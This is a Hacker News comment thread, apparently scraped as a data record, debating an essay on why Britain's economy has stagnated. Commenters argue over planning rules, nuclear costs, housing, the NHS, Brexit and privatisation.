intermittent power, however, these high costs are not intrinsic to nuclear. In general, it is expensive to build reactors for the same extraneous reasons that it is expensive to build railways and trams. And, as with trams and trains, if we can make it cheaper to build nuclear reactors, we can have a lot more of them. Britain wasn’t always this expensive. For plants constructed before 1995, Britain averaged £4.79 million per MW, about half of the estimated costs for Hinkley Point C and Sizewell C. Even the most expensive reactors permissioned and commissioned under Margaret Thatcher and John Major, Sizewell B and Torness, were only two-thirds the price in real terms of the plants we are planning today. These plants have produced zero-emissions power for decades and could continue to do so for decades more if they weren’t being closed down. One reason nuclear power is so expensive to build is that it is beset by extreme delays and uncertainty caused by planning and environmental approval processes. These arise even when deploying completely safe, widely used designs that have been built in Britain before. From being proposed in a UK government white paper, to the start of construction, Hinkley Point C took ten years. By contrast, France and Finland have started building similar reactors in just three or four. With a 44,260 page environmental impact assessment (EIA) and 2,229 written questions at examination stage, Sizewell C, the next reactor after Hinkley Point C, faced enormous expense before a spade was even in the ground (which it still is not). As the recent MHCLG policy paper Getting Great Britain building again pointed out, Sizewell C’s EIA is ‘more than 30 times longer than the complete works of Shakespeare.’ Nuclear power has also suffered from many of the problems that have inflated the cost of transport projects. Rather than setting up a pipeline of nuclear projects, we are designing and approving each one in isolation. There is no strong interest group in favour of reducing costs, so trivial objections – like the ‘problem’ of a few dozen fish being sucked into a reactor’s cooling system and killed – lead to further delays and expense (in this case, with an underwater megaphone to scare fish away). Spurious concerns about trace amounts of background radiation, long-debunked by the hundreds of nuclear reactors in operation worldwide, are treated with grave seriousness in each case, rather than being immediately identified and dismissed as obstructionist pseudoscience. Although most of the developed world has suffered similar increases in the cost of building new nuclear, although less extreme than Britain’s, there are some notable exceptions. South Korea stands out among developed countries as building nuclear power stations that are reliable, safe, and cheap: Korea builds reactors domestically for about a sixth of the cost that Britain does. A key reason it can do this is that it builds nuclear plants in fleets. For each design, KEPCO, South Korea’s nuclear company, builds 8-12 reactors in a row, meaning it benefits from economies of scale and learns by doing. (Similar benefits of learning-by-doing through repeated builds of similar designs have been observed in the Chinese nuclear build-out.) KEPCO is now building reactors for the UAE at less than half the cost of Hinkley Point C per unit of energy. It has just been contracted to build in Czechia for a quarter the price of Hinkley. The UK thus has one hard, but potentially rewarding, option of attempting to streamline nuclear reactor approvals and delivery, perhaps through opening up a new pathway to ‘small modular reactors’ or ‘microreactors’ that avoids the wasteful cost of our existing regulatory system. If successful, this would have the dual benefit of enabling cheap, abundant, clean energy, and the creation of a potential export industry that could offer cheap nuclear power to other developed countries. The faster and cheaper option would be to simply follow the Czechs and call KEPCO, asking how many nuclear reactors it could provide at similar or lower costs, and how quickly they can get going. An energy superpower once again Britain’s rise to become the world’s first industrial nation was predicated on its remarkably early exploitation of fossil fuels, especially coal. The age of coal is over. But in the 1950s and 1960s, another era as an energy giant and industrial power seemed to be dawning, with the rise of nuclear power, a technology in which we led for decades. Our failure to do this was cushioned by the discovery of North Sea oil. It can’t cushion us any more. Deindustrialisation was not the inevitable result of economic progress. To our $4,300 of annual manufacturing output per capita, the Americans produce $6,700; the Swedes $7,300; the Germans $8,500; and the Swiss $20,000. These are all advanced economies in which the biggest fraction of employment and output is services. But part of their higher productivity is that they have kept their energy costs well below ours and avoided the erosion of their industrial base that we have experienced. We can reverse this. Abundant clean energy is achievable with technology that already exists. What is lacking is a reliable pathway to allow it to get built. Fix that, and Britain could see itself become an industrial heavyweight for the second time in its history. The prize The fundamental thesis of this essay is that Britain can have rapid economic growth in the near future, swiftly catching up with the world’s most prosperous countries. It can do this because the sources of its current sclerosis are easy to identify and straightforward, in principle, to fix. The problem is not too little investment by the state. It is that the state has prohibited most of the investments we need to make. The solution is to remove these obstacles to investment, mobility and trade, in a politically viable and durable way. We should not despair. Britain has been here before a century ago, and triumphed. By the end of the 1920s, Britain was still reeling from the national catastrophe of the First World War. Many damaging emergency measures that had been brought in during the War still lingered, it was recovering from levels of inflation never seen before or since, and economic growth had slowed to a crawl. The housing sector was moribund, thanks to a combination of rent controls imposed during the First World War, tight lending policy, and the effects of rapid inflation, which made the rent controls even more punitive in real terms. Stanley Baldwin’s government abolished rent controls and removed mortgage regulations by 1932, causing a dramatic housing boom that provided the foundations for the British economic miracle of the 1930s. Millions of extra homes were built in just six years – the fastest period of building ever – probably adding several percentage points to GDP growth in just a few years. The homes were concentrated in the cities in which Britain’s key growth industries were based, giving those industries access to the workforce they needed to continue expanding. It may have been the greatest rapid expansion in a given economic sector in British history, and it was the key reason we didn’t experience a Great Depression while Germany, the USA, and France did. These homes were enabled by rapid infrastructure development: new roads such as the A3 Kingston Bypass, an enormous expansion of the bus network, and extensions of many of the major railways and tube networks, with the Piccadilly, District and Northern Lines sweeping out into suburban London. During this time Britain built its national electricity grid, in one of the most remarkable achievements of engineering and public works in modern history. In the space of three years, the new Central Electricity Board devised a plan to connect more than 100 of the UK’s most efficient power stations into seven local grids across the country, and passed the legislation needed to enable the plan and begin work on it. It took just five years for the project to be completed in 1936, with 4,000 miles of cables running across 26,000 pylons around the country being built in this time. In 1937, a year after the seven local grids were finished, a group of impatient and rebellious engineers switched on the connections between the seven grid areas themselves to form a single national system, deciding it was easier to ask forgiveness than permission. They created a world-class grid that remains in operation to this day. The price of electricity collapsed and the share of the population connected to electricity soared, rising faster than in any other country on earth. Britain went from being a laggard to a leader in electrification in just a few years. We believe that Britain can enjoy such a renewal once more. To do so, it need simply remove the barriers that stop the private sector from doing what it already wants to do: build homes, bridges, tunnels, roads, trams, railways, nuclear power plants, grid connections, prisons, aqueducts, reservoirs, and more. The immediate effect would be large increases in employment in construction, energy, real estate, plumbing, factories, steelworks, cement production, surveying, architecture, design, and more. It would mean large inflows of capital to invest in these newly available opportunities. There is massive pent-up demand for new housing, more energy supply, more and better transport links, and more childcare provision, as shown by their high prices. Since a price is ‘a signal wrapped in an incentive’, making it easier to build and supply th",
    "commentLink": "https://news.ycombinator.com/item?id=41600388",
    "commentBody": "[flagged] Foundations: Why Britain Has Stagnated (ukfoundations.co)138 points by tollandlebas 9 hours agohidepastfavorite262 comments glomph 5 hours agoThis website makes some claims about what has caused both growth and decline that are pretty contentious. I think that many would argue that the growth following the second world war was the result of massive state investment in public services like creating the NHS and the building of council housing. They baffelingly attribute yhat growth to the Conservative Govrernment of the 1930s rather than the post war labour government. Similarly this page attributes growth in the 80s to the Conservative government privatisation program. Again many would argue that was actually the start of the decline which we are feeling the pain of now with things like a terrible and fractured rail service and not enough housing. I think a perfect example of this is our water companies that have been private since the 80s and have done nothing but pay dividends to shareholders and now we have a disaster with shit being poured into all our rivers and costs to households rising dramatically. Edit: I read on and they use the drop in passengers in the railway in 1965 as an argument against nationalisation of the rail service, somehow neglecting to mention the beeching cuts! That is incredibly missleading given 55% of stations were axed due to a /reduction/ of state infrastructure at that time. reply nmadden 5 hours agoparentOne of the authors is from the Centre for Policy Studies. Another is from the Adam Smith Institute. These are the gang of shady right-wing think tanks that brought us Truss and Kwarteng. That tells you everything you need to know about their economic competence. reply kranke155 3 hours agorootparentTheir solution is to allow private funds to fund essential infrastructure, it seems. Which to me just rings hollow, or at best, only a part of the answer. They're correct on some aspects of it, other parts they just gloss over. IE They say that there has been an \"erosion\" of the industrial base in the UK, while actually the blame could be laid at the feet of Thatcher's service-led policies. reply throwaway48540 5 hours agorootparentprevWhat is shady about them? Are they criminals? reply nmadden 4 hours agorootparentAs rjsw says, they refuse to disclose who funds them. See https://www.monbiot.com/2022/10/07/thinktanking-the-country/ for some background. reply schmidtleonard 5 hours agorootparentprevTheir agenda is to frame the self-serving interests of a very narrow group as the economic interests of everyone. That's shady. reply PaulDavisThe1st 5 hours agorootparentprevIf you consider tanking the UK economy to the tune of hundreds of millions if not billions of pounds, then yes, absolutely. reply throwaway48540 4 hours agorootparentHow could they possibly do that? reply grumpy_coder 3 hours agorootparentThey are referring to the liz truss budget. reply mike_hearn 7 minutes agorootparentWhat happened wasn't primarily due to her budget. It was due to a meltdown in the pension sector triggered by over-leverage, arguably caused by the BoE not doing its regulatory duties correctly. Don't get me wrong, a budget that cuts taxes without cutting spending is no good. But the idea that what happened was a direct consequence of that doesn't make much sense as it had been telegraphed a long way in advance, giving the markets plenty of time to adjust. The central bank changed monetary policy a day before the mini-budget, and changes in that are kept secret until the moment of announcement. Additionally, UK spending has since blown through what the mini-budget would have created without any sudden market turmoil. https://www.ft.com/content/4701b6ac-851e-43fd-a2b2-b38dd07c7... Regulators failed to anticipate the dangers that borrowing by pension schemes posed to the stability of the UK’s financial system, according to a parliamentary report into the turmoil that hit the gilt markets following Liz Truss’s disastrous “mini” Budget in September last year. Pension schemes suffered multibillion-pound losses after they were forced to sell assets to ensure that complex derivative-linked strategies — known as liability driven investments (LDI) — did not implode when gilt yields jumped as investors rejected the then prime minister’s economic strategy. Also, Truss is basically correct that the UK needs more growth. Disagreeing on her tactics is reasonable, disagreeing on her goals isn't. She was unfortunately attempting to create growth from a position of weakness: in a party that didn't want to do anything hard like cutting spending, and with a fragile/over-leveraged financial sector. throwaway48540 3 hours agorootparentprevSo it is the elected representatives who are responsible for choosing them and implementing whatever they suggested? reply PaulDavisThe1st 2 hours agorootparentBeing elected doesn't remove your obligations to follow sane, moral policies. reply throwaway48540 2 hours agorootparentThat's my point. Crazy economists are not responsible for the damage, it's the elected people who listened to them and followed through. To create an intentionally extreme parallel, imagine they have chosen a group of idk, satanists. Would you blame the group of satanists for being satanists, or the people in charge of a country who contacted a group of satanists for advice? reply rjsw 5 hours agorootparentprevThey refuse to say who funds them. reply GordonAShumway 4 hours agorootparentprevHats. The fedoras they wear shades their faces from view, m’lady reply maxehmookau 5 hours agoparentprev> Again many would argue that was actually the start of the decline which we are feeling the pain of now with things like a terrible and fractured rail service and not enough housing. I agree, this is pretty wild and made me immediately look up who was behind this. Conservative think-tanks gotta conservative think-tank. reply schmidtleonard 5 hours agoparentprevIf the asset prices don't grow, how will the rich people get paid for being rich? Won't anyone think of the poor rich people! reply mike_hearn 1 hour agoparentprevNone of what the website says is actually contentious outside of Labour/left wing circles. Economic growth isn't that complicated when coming from behind - but as they say, it's hard if there isn't enough energy or housing. > I think that many would argue that the growth following the second world war was the result of massive state investment I don't think anyone with a strong grip on economics or British history would argue that. The fact is that post-war rationing continued longer in the UK than it did in Germany, the country that actually lost the war, and Germany recovered far faster in other ways too. Decades of very left wing governments left the UK in a terrible state by the 1970s relative to its peers - it was called the sick man of Europe and needed an IMF bailout - a situation fixed only by Thatcher. This history is well known not only in the UK but internationally. The website provides supporting evidence if you aren't familiar with this. > our water companies that have been private since the 80s and have done nothing but pay dividends to shareholders That this sort of absurdly false belief gets repeated unchallenged so often in Britain is exactly why it's falling behind. Thames Tideway, one of the largest engineering projects in Europe and the biggest upgrade to London's sewage system ever, is organized and financed by the private sector (pension funds, Allianz, Amber IG, Dalmore Capital and DIF). https://en.wikipedia.org/wiki/Thames_Tideway_Tunnel#Funding_... It's literally being built right now and yet you claim the private sector hasn't invested. The reality is the opposite. As the website points out, British governments have historically struggled to do capital investments because the moment money becomes available the unions always take it all. Only the private sector has sufficiently good labour relations to actually build things and the water industry is a good example of that in action. Compare to the NHS where the government has regularly tried to ringfence money for capital investments (repairing leaking hospital roofs etc), only to see its direct orders ignored and the money used for pay rewards instead. > 55% of stations were axed due to a /reduction/ of state infrastructure The stations were axed due to long term decline in passenger numbers, a situation that reversed immediately upon privatization: https://en.wikipedia.org/wiki/Privatisation_of_British_Rail#... reply ajross 4 hours agoparentprevIndeed, this is spun nonsense. The problem with the UK right now is brexit. You can see it on a GDP graph: https://www.macrotrends.net/global-metrics/countries/GBR/uni... It's growing steadily through the 60's-2000's, has a notable dip[1] at the 2008 financial crisis, then starts growing again until just about 2015. And it's been flat since. The UK had found a profitable niche as the transatlantic hub of finance and commerce, and threw it out the window in a fit of nativist pique over the wrong languages being spoken on street corners. [1] More pronounced than comparable nations, to be fair. The UK was always more dependent on finance. reply thedrbrian 4 hours agorootparent>The UK had found a profitable niche as the transatlantic hub of finance and commerce, and threw it out the window in a fit of nativist pique over the wrong languages being spoken on street corners. But we’ve imported millions of people that speak different languages since 2015 , why hasn’t line gone up? reply ajross 4 hours agorootparentI think this is sarcasm, but just to spell it out: this is a causation/correlation fallacy. Immigration is a result of global trade, not its cause. Brexit killed the trade part without actually doing anything about immigration policy. reply pjc50 3 hours agorootparentThe incredibly stupid part of all this is that the conservative government insisted on wrecking the trade side because reducing immigration was deemed more important, and then entirely voluntarily issued a lot of work permits. (without even getting into the more obligatory areas of immigration like refugees and marriages) reply cscurmudgeon 4 hours agoparentprevWater quality by country. https://worldpopulationreview.com/country-rankings/water-qua... US is good while countries with more left leaning setups do bad. It is not as black and white as you imply. reply SketchySeaBeast 4 hours agorootparentI'm confused at your point - I look at the countries we typically view as more left leaning and both Canada and Europe as a whole has better water quality. If anything, it seems to be a delineation of first world status. reply feedforward 4 hours agorootparentprev> US is good while countries with more left leaning setups do bad. Huh? This is a map of the industrialized countries - western Europe, the US and Canada, Australia and New Zealand, Japan and South Korea. Not sure how \"left leaning setups do bad\", the Scandinavian countries seem to have good water. reply openrisk 5 hours agoprev> Nor can austerity or the hangover from the financial crisis explain Britain’s malaise. The financial crisis was at least as turbulent in the United States as here. Yes it can. For the UK the financial sector was a dramatically important one, more so than practically for any other major country. London was the undisputed financial center for whole Europe and beyond, a legacy of Empire days, the pound as reserve currency etc. This had serious distorting effects: Abysmal center-periphery inequalities; the fatal attraction of talented people to lucrative but mostly pointless financial engineering games; the neglect of \"bricks and mortar\" etc. The financial crisis and Brexit demolished this fragile, hyperconcentrated economic posture. Not in the sharp and seemingly recoverable fashion that, e.g., COVID damaged the tourism industry of various countries but in a chronic, gentle decline kind of way. In the long-term one would think that the immense cultural heritage of Britain across pretty much the entire knowledge spectrum would somehow translate into a way forward. But as we increasingly get to know all too well, the problems of modern societies are self-inflicted and they reflect fundamental breakdowns of social contracts. Yes, despite what that British lady said, there is an emergent phenomenon called \"society\" and if you deny its existence you will get devoured by demons of its own creation. reply mike_hearn 57 minutes agoparentThe financial crisis was a specific event and other countries had put it behind them within a few years. The UK's growth inflected around that time and never recovered since. It doesn't make much sense to argue a temporary event changed UK productivity or economic growth permanently, especially as the only reason to think that is rough temporal proximity. There were other things going on at that time too that are equally or more plausible e.g. mass immigration from eastern Europe was kicking into gear around that time as well, which created a glut of cheap labour. Cheap labour always kills productivity growth because there's no reason to invest in automation. > Yes, despite what that British lady said, there is an emergent phenomenon called \"society\" and if you deny its existence you will get devoured by demons of its own creation. Thatcher was responding to people who asserted that for any given problem, \"society\" should solve it or pay for it. Her answer made the obvious point: when it comes to taxation, there really is no such thing as society. To complete the quote: \"they are casting their problems on society and who is society? There is no such thing! There are individual men and women and there are families\". reply BillFranklin 6 hours agoprevThis is pretty bleak reading for a resident of the UK! It's a good explanation for why there's stagnation (generally not allowed to build here). I'm a fan of their work (see the housing theory of everything [1] which is also good). I'd be interested to read what they think can be done about the planning issue. The new government hasn't really come through on their promise to address it. They ran out of low hanging fruit pretty quickly. They're focusing more on rental reform rather than on supply. Gov modified the NPPF in odd ways (e.g. reduced targets in London, where need is highest). They set up a panel to look at new towns which will report back in a year. This bit at the end made me laugh: > it need simply remove the barriers that stop the private sector from doing what it already wants to do Unfortunately these supply-side policies causing stagnation are representative of what our ageing population actually wants. The average 50+ voter thinks demand is too high and should be cut until supply catches up (in 33 years) [2][3]. [1]: https://worksinprogress.co/issue/the-housing-theory-of-every... [2]: https://yougov.co.uk/topics/society/trackers/the-most-import... [3]: At the current rate of house building it would take 33 years for the UK to reach France's current dwelling to person ratio, assuming UK's population growth stops. reply PaulRobinson 5 hours agoparentThe \"new Government\" has not yet been in power for 100 days. How exactly have they not \"come through on their promise to address it\"? Given the old government didn't come through on similar promises on planning for 14 years, I think we can give them another year or so to get policy and statutes in place, no? reply BillFranklin 5 hours agorootparentYes I hope they’ll find a solution and get re-elected. In some cases changes to frameworks require a 1 year consultation (planning permission to change planning permission rules!) so I am sure it will take years to see an increase. My point was their changes announced so far seemed bitty and wouldn’t address much of the issue. The problem is hard! Even if you do build 500k homes a year (2x current) in places people don’t want you to build, it will still take 15 years to catch up, and they might be voted out before then because voters don’t want it. reply falcor84 5 hours agorootparentprevAt this point in time I'm just jaded about the whole political discourse - it seems that 90% of the discussion is devoted to \"what they did\" and \"what we could do\", with almost none about \"what we did, and here's how we believe it actually affected your life\" reply gm3dmo 5 hours agorootparentprevfeels like the government need to set the tone for the rental market first then both owners and builders can decide if they want to participate. reply pjc50 5 hours agoparentprev> Unfortunately these supply-side policies causing stagnation are representative of what our ageing population actually wants. This is basically it. The pensioners don't want change. They might theoretically want some nebulous \"improvement\", but only if it doesn't cost anything, doesn't involve building anything, or even a change of use, doesn't make any noise, doesn't increase traffic, and doesn't involve any immigration. The people demand stagnation. reply sgt101 8 hours agoprev\"It may have been the greatest rapid expansion in a given economic sector in British history, and it was the key reason we didn’t experience a Great Depression while Germany, the USA, and France did. \" But Great Britain (as it was then) did experience a great depression. 3.5 million people were unemployed in 1932. Ok - one could say that the depression in GB was less pronouced vs. the situation from 1918 on, but I think that there is a lot of cherry picking & spin in this article. Comparisons are not made consistently and the context from history mean some things matter less in the UK and matter more, and have happened for particular reasons. For example folks often talk about reservoirs, but fundamentally the UK's reservoirs were largely built to support an industrial demand that is simply not there - and this capacity remains despite the loss of demand. There are some good points, but I think they are obscured by the polemic. reply kranke155 3 hours agoparentIt appears to have been produced by a right wing think tank, justifying its seeming lack of focus on how public funds could help build infrastructure vs the author's seeming obsession with private financing. reply fidotron 7 hours agoprevI left the UK almost 20 years ago, and cannot imagine returning for any length of time. My personal take on this is the UK got so used to having an empire, and specifically India, which could absorb more British bureaucrats than the UK could possibly produce. Consequently when Indian independence occurred this massive pipeline of producing people for running colonies had nowhere to go, and a large number moved back to the UK. What you have now is a class of people have been trying to run the country as a colony of itself with rather predictable results. The UK has a broken culture, and until they start valuing things appropriately they will stay that way. reply pjc50 5 hours agoparentI don't think this is about the number of civil servants so much as the attitude of running everything from the Imperial core. Becomes apparent when you ask questions like \"now that there is a Scottish Parliament, what exactly does the Scotland Office do?\". There's no California Office in the American government, no Jura office in the Swiss government, because those are federal systems with a clear division of power across different levels. See also terrible attitudes to local government. Part of London's recovery is getting its own governance back after the abolition of the GLC. Ihe Assembly is also slowly imposing sensible ideas like Regent Street pedestrianisation on London's councils. Andy Burnham is doing great as mayor of Manchester. reply chaostheory 4 hours agorootparentThe power dynamic is apparent when you have to refer to provinces as “countries”. reply gadders 7 hours agoparentprevWe ran the empire with a lot less civil servants than we have now: https://blog.nationalarchives.gov.uk/uk-government-did-we-ru... reply fidotron 7 hours agorootparentIn the census in 1921 there were over 150000 British Subjects in India. Over 40000 of them were women, so we are not talking just army. In 1891 there were 238,409 with english as their mother tongue (before the census broke this out). reply barry-cotter 7 hours agoparentprevThe Indian Civil Service was always tiny. There were so few British in India that in 1950 when the Indian government surveyed the populace to try and see if they knew the British had left they discovered the average Indian wasn’t aware there had ever been a British Empire. The British Empire in India and the British Army in India at all but the most rarefied levels were staffed by Indians and there weren’t even that many of them. > At the time of the partition of India and departure of the British, in 1947, the Indian Civil Service was divided between the new Dominions of India and Pakistan. The part which went to India was named the Indian Administrative Service (IAS), while the part that went to Pakistan was named the \"Civil Service of Pakistan\" (CSP). In 1947, there were 980 ICS officers. 468 were Europeans, 352 Hindus, 101 Muslims, two depressed classes/Scheduled Castes, five domiciled Europeans and Anglo-Indians, 25 Indian Christians, 13 Parsis, 10 Sikhs and four other communities. https://en.m.wikipedia.org/wiki/Indian_Civil_Service reply fidotron 7 hours agorootparentIt takes more than the civil service to run a colony. It is quite curious both you and the other replier jumped to that conclusion, and says quite a lot about the current British malaise. reply barry-cotter 6 hours agorootparentI’m not British, I’m just not ignorant of Indian history. At partition the entire British population of India was about 100,000 including the army, civil service, civilians and family of same. Even if you round up to 1,000 the number of ICS officers and dectuple to 10,000 you get a trivial number of returnees to the UK. The British Army in India returning would have had nugatory impact considering the British had just fought WW2. Leaving India was bad for the British upper classes because there were fewer jobs as officers that would keep a man in the store to which he had become accustomed on salary in the army. The ICS was less important than that in terms of numbers and its peak social impact was as an inspiration for the British civil service. The ICS is the only organisation in British India that might plausibly have had a large impact on the culture of the British civil service and it was too small to have had an impact by numbers alone as you originally posited. reply fidotron 6 hours agorootparent> Even if you round up to 1,000 the number of ICS officers and dectuple to 10,000 you get a trivial number of returnees to the UK. Why are we obsessed with restricting discussion to ICS? The bureaucracy is not just that, but extends throughout the entire service sector these people rely on, such as banking, schooling, transportation, manufacturing management and so on. There is real denial going on here as to the extent of what happened. reply barry-cotter 6 hours agorootparent> Why are we obsessed with restricting discussion to ICS? The bureaucracy is not just that, but extends throughout the entire service sector these people rely on, such as banking, schooling, transportation, manufacturing management and There is no plausible mechanism by which these people could have effected a radical change in the general British culture or the culture of the British civil service. The culture of the British in India was an expatriate one, not one of colonial settlement or intermarriage (certainly not after 1900). They weren’t different enough from the British population to have any noticeable effect even though in class composition the civilian element was elevated in education and social class compared to the general population. The pied noirs in Algeria were settlers and they were distinctly different in terms of ethnic composition, being disproportionately Spanish, Maltese and Italian in ancestry compared to French from l’Hexagone and it’s still a matter of debate if their descendants are noticeably different from other French. The British in India were just that. Not a lot more culturally influential in the home country than the British in the UAE. As of 2015 there were A quarter of the million Britons in the UAE. That’s more than twice as many people from Britain in a petrostate then were ever in India. reply fidotron 6 hours agorootparent> There is no plausible mechanism by which these people could have effected a radical change in the general British culture or the culture of the British civil service. These people were somehow capable of running India and yet at the same time could not cause a change in the UK if they returned en masse? > They weren’t different enough from the British population to have any noticeable effect You have a very odd view of life in the UK if you believe this. reply barry-cotter 3 hours agorootparent>> They weren’t different enough from the British population to have any noticeable effect >You have a very odd view of life in the UK if you believe this. If all 250,000 Britons in the UAE returned to the UK in the next three months I would expect it to have no noticeable effect a year from now. By the same token I wouldn’t expect much from 100,000 Brits moving from India to the UK in 1947. West Indian migration starting in the 1960s or Ugandan Indians in the 1970s are movements of people who are genuinely different in important ways. Those had no great effect on the civil service culture either. reply fidotron 3 hours agorootparent> If all 250,000 Britons in the UAE returned to the UK in the next three months I would expect it to have no noticeable effect a year from now. Those 250k Britons in the UAE are not state supported colonists, and so do not have the attitudes and culture of state supported colonists. Edit: specifically the colonial attitude that the inhabitants of a colony exist as a natural resource to be exploited purely for the benefit of the colonists. This is now the attitude that exists throughout the UK state towards the inhabitants of the UK. reply benjaminwootton 8 hours agoprevI’ll need to sit down and read this properly, but I would say there is a real stench of decline in England at the moment and pretty much everyone here would agree. It’s readily apparent the new government won’t save us already. Public services in particular: 2 weeks to see a Dr, a year for an operation, unlikely for the police to attend your call out, stagnant economy, high cost of living and low wages. And all whilst we have one of the highest tax burdens in our history. reply kjellsbells 5 hours agoparent> It’s readily apparent the new government won’t save us already. I dont follow this line of reasoning too well. The conservative party was in power for fourteen years, 2010 to 2024. The new Labour government has been in power for less than fourteen weeks. Isnt it too soon to make any claims about their performance fixing the structural issues identified in this report? reply mike_hearn 37 minutes agorootparentMaybe but probably not by this point. If Starmer were engaged and keen to fix these problems, he would have clearly articulated the problems outlined on the website, stated a plan to solve them and now be doing things to advance it. What he's actually done is the opposite. For example, the website makes the point that British governments often don't do enough capital investment so state-controlled infrastructure rots away. Instead spending rises get used to buy off unions. Sure enough, within just months of Labour coming into power it's already handed out around £10 billion/yr worth of pay rises: https://inews.co.uk/news/public-sector-pay-deals-cost-323074... This type of behavior led to pay spirals in the 60s and 70s. We see this problem elsewhere. Labour's plan to build new prisons is simply to override local councils that are blocking planning applications, but that won't yield funds for actually building them. Where's the capital going to come from in a government that capitulates immediately to union pay demands, and which is already financially over-stretched? To do this they would need to make major cutbacks in other areas, but they have no plans to do this. reply ta1243 7 hours agoparentprevI've been to my GP half a dozen times in the last year, always same day. Last time I went I was sent for a chest x-ray, which wasn't done at the GP, I had to drive to the place and wait 40 minutes for that, bit of a pain. Main problem I see is housing. It drags the entire economy -- people are living in overcrowded, people in their 30s living with parents etc. Anyone living on their own sees all their income drained by landlords, who then pump it into ever increasing housing costs as they out-bid each other. Anyone else never becomes an adult and pumps their money into things like onlyfans and coke. reply Nextgrid 5 hours agorootparent> Anyone living on their own sees all their income drained by landlords The entire country's economy feels like a property-indexed Ponzi scheme, with everyone (including the government) rather keep fueling the ponzi as long as possible rather than breaking it up. reply dash2 5 hours agorootparentprev>I've been to my GP half a dozen times in the last year, always same day. Good for you, but I think that is absolutely not the typical UK experience. reply apwell23 5 hours agorootparentprev> GP half a dozen times in the last year, you are going to GP every two months? Usually you get referred to a specialist if you are that sick. reply physicsguy 4 hours agoparentprev> And all whilst we have one of the highest tax burdens in our history. It's easy to have a low tax base when you subsidise the state spending with North Sea Oil from the 80s onwards... Prior to that we had really bad balance of payments crises from the Second World War onwards as the empire fell apart. Low and middle earners in the UK pay pretty much the lowest taxes in Western Europe. We've eroded our tax base all over the place and somehow expect European services. reply card_zero 7 hours agoparentprevQuack medicine products used to be sold (and sometimes still are) by asking in adverts \"do you feel vaguely unwell?\" and promising to vaguely cure the condition. Similarly, it's easy to sell the public on a vague sense of national decline, and this is a long-standing key part of populist politics. reply barry-cotter 6 hours agorootparentBritish GDP per capita has been flat since 2008 while the US’ has gone from $49K to $81K. The UK has declined in relative terms compared to what used to be a near peer. reply card_zero 6 hours agorootparentIt may also be true that there's a national decline, I'm just saying to be very cautious about getting swept up in the idea. For instance, apparently America needs to be Made Great Again, facts notwithstanding. reply regularfry 4 hours agorootparentCertainly one should take TFA with a pinch of salt rather than at face value. It is incredibly partisan. reply PaulRobinson 5 hours agoparentprevI don't agree, and your data points don't match my own. How is it readily apparent the new government won't \"save us\" when they haven't even got to 100 days in, yet? reply tempfile 5 hours agorootparentIt's not readily apparent, it's just FUD to lay the ground for the tories to come back. They're all the same, after all :-) reply thorin 5 hours agoparentprevI've been able to see a Dr on the day I've called several times in the last couple of years. Operations happen reasonably quickly if they are \"required\", it's the non urgent ones that now have ridiculous waiting lists. The economy/wages issue, seems to be worldwide since covid and the various recent wars. The new Government has had no real time to do anything yet everywhere on twitter/fb I see hundreds of people complaining, who didn't do enough complaining in the last 14 years. What happens with the current Government is yet to be seen, but it's certainly difficult to make any meaningful change in a single term. reply stef25 5 hours agoparentprevIt's hard to understand how people view the NHS. Some people claim it's the national treasure, but how does that work if service is as abysmal as what you describe ? reply whywhywhywhy 5 hours agorootparentIt's because the experience you get is completely random and heavily weighted towards the fatal. If you show up with something life threatening they're actually pretty good. But your experience of non-life threatening can be anything from good, to indifference/boredom to aggressive dismissal. This also applies to things that could be markers of something fatal, analogy would be they do little when smoke is coming out from under the door but do jump into action when the flames are coming out from under the door. Most of the interactions start on off the foot that you're assumed to be a timewaster too. Keep begging my parents to just go private because I don't like trusting their lives to the random chance they have a good doctor when I can instead have one incentivized by their continued existence. reply 76SlashDolphin 3 hours agorootparentThe issue is that underfunding the NHS has become so bad that even very serious cases can't be handled appropriately. I know it's an anecdote, but I've had a fairly bad experience recently after a serious bike incident in the middle of a workday, and they took over an hour to send an ambulance, about an hour to be checked, and over 7 hours in the Royal Hospital waiting for treatment. Legitimately was a worse and slower service than I would have had at my grandparents' place in Eastern Europe, it's a disgrace. It still makes me angry that it's the experience I get after paying 1000s of £ in NHS contributions. reply otoburb 5 hours agorootparentprevYour description of the NHS sounds exactly like the Canadian healthcare system. >>Keep begging my parents to just go private [...] Except for this difference as we don't have the option to choose private care except for a out-patient services (e.g. physical therapy) and certain drugs & therapies. I'm speaking primarily about Ontario and British Columbia, but I think the other provinces and territories are similar. Hospitals, diagnostic services and physicians are all funded by public taxpayer dollars at both the provincial and federal level, but it is indeed a single healthcare system. reply thorin 5 hours agorootparentprevMain problem with systems outside the NHS and I'm really talking about the US here is if you have a major accident or a terminal illness you can easily be bankrupted if you make a wrong decision around insurance and that's not cool. I see far too many GoFundMe's for people with illnesses in the states and that is no way to run a country. reply fidotron 5 hours agorootparentprevThe local variation is incredible. Where I am from the village health services act as gatekeepers for the more central services. Just in my direct circles I know of several situations where the central services gave the village services an earful for failing to refer people faster, in at least one case directly leading to death. Those central services also seem to get further away every few years. reply zelos 5 hours agorootparentprevEveryone loves the NHS in an abstract sense, but mostly if you ask them, they'll have stories about how terrible actually being treated by the NHS is. reply regularfry 4 hours agorootparentpreva) it hasn't always been bad (although it has always been a right-wing punching-bag); b) it has the potential to be a lot better than it currently is; c) a lot of the people actually in it care desperately about seeing that happen, and because of its size that's a surprising proportion of the population. reply cja 5 hours agorootparentprevIt's the national religion. reply apwell23 5 hours agoparentprev> 2 weeks to see a Dr, a year for an operation Its the same in USA if you want to see a specialist. There is a worldwide shortage of qualified doctors. I waited about 1.5yrs to get a routine endoscopy at northwestern hospital in chicago. We've gone to northwestern in downtown for decades and have never seen waits this bad. reply ethbr1 5 hours agorootparentIronically, a lot of the US medical professional problem mirrors housing -- supply limited by fiat, to the advantage of existing suppliers. https://www.medicaleconomics.com/view/match-day-2023-a-remin... reply diggan 5 hours agorootparentprev> There is a worldwide shortage of qualified doctors. I'm not sure you can extrapolate that it's worldwide because things are the same in UK and US. FWIW, I had surgery in Spain recently and had to wait like two-three months tops. Probably depends a lot on the type of surgery and how urgent it is. reply gramie 5 hours agorootparentMy brother had a hip replacement in Paris this week. He booked the operation two weeks ago. His angiogram (required for the surgery) was performed 3 hours after his consultation with the surgeon. The clinic is considered the best one specializing in joint replacement surgery in all of France. Total cost for surgery, follow-up, and 3 days in hospital (he lives in a French Overseas Department so he gets reimbursed): 18,000 Euros. reply apwell23 5 hours agorootparentprevyea could be my specific hospital. I've heard from indian colleagues that if you sprain your ankle you can see someone immediately but if you get cancer and need to specialist then you are competing with thousands of ppl to see that doctor. reply neilo40 8 hours agoparentprevSame in 